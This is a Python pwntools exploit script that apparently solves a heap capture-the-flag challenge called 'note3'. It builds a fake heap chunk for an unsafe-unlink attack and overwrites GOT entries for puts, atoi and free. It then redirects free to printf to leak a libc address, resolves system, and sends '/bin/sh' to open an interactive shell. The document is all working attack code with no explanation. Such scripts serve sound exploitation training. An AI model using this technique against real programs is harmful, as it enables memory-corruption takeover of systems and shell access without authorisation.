# -*- coding: utf-8 -*-
from pwn import *

#context(log_level='debug')

p = process("./note3")
elf = ELF("./note3")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def newnote(length, content):
    p.recvuntil('option--->>')
    p.sendline('1')
    p.recvuntil('(less than 1024)')
    p.sendline(str(length))
    p.recvuntil('content:')
    p.sendline(content)

def shownote(id):
    p.recvuntil('option--->>')
    p.sendline('2')
    p.recvuntil('note:')
    p.sendline(str(id))

def editnote(id, s):
    p.recvuntil('option--->>')
    p.sendline('3')
    p.recvuntil('note:')
    p.sendline(str(id))
    p.recvuntil('content:')
    p.sendline(s)

def deletenote(id):
    p.recvuntil('option--->>')
    p.sendline('4')
    p.recvuntil('note:')
    p.sendline(str(id))

#gdb.attach(p)

ptr = 0x6020c8
payload = p64(0)+p64(0x21)+p64(ptr-0x18)+p64(ptr-0x10)+p64(0x20)
newnote(0x50,payload)
newnote(0,"")
newnote(0x80,"")
payload = 2*p64(0)+p64(0x70)+p64(0x90)
editnote(1,payload)
deletenote(2)

payload = 3*p64(0) + p64(elf.got["puts"]) + p64(elf.got["atoi"]) + p64(elf.got["free"])
editnote(0,payload)

# modify free
editnote(2,p32(elf.plt["printf"])+"\x00")
deletenote(0)
x = p.recvuntil("Delete success")
putsAddr = u64(x[1:7]+"\x00\x00")
log.success(hex(putsAddr))
libcBase = putsAddr - libc.symbols["puts"]
systemAddr = libcBase + libc.symbols["system"]
log.success("system:"+hex(systemAddr))

editnote(1,p64(systemAddr))
p.sendline("/bin/sh")
p.clean()

p.interactive()
